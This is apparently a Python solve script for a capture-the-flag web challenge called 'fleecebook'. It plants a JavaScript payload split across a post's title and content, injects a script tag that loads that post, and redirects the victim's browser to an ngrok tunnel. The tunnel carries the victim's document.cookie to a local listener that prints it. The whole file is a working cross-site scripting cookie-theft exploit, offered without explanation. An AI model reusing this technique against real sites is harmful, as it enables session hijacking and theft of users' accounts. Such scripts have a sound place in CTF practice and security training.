from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from urllib.parse import quote, unquote

import pyperclip
import requests
from pyngrok import ngrok

HOST = 'https://fleecebook.tjc.tf'

class Receiver(BaseHTTPRequestHandler):
  def log_message(self, *args):
    pass
  def do_GET(self):
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b'OK')
    print(unquote(self.path[1:]))

class Server(Thread):
  def run(self):
    server = HTTPServer(('localhost', 12345), Receiver)
    server.handle_request()

Server().start()
tunnel = ngrok.connect(12345)

script = requests.post(f'{HOST}/post', data={
  'title': f'location=`{tunnel.public_url}/`+encodeURIComponent(document.cookie)/*',
  'content': '*/'
}).url

script_tag = quote(f'<script src="{script}"></script>')
malicious = f'{HOST}/{script_tag}'
pyperclip.copy(malicious)
print('Submit this (copied to clipboard):', malicious)
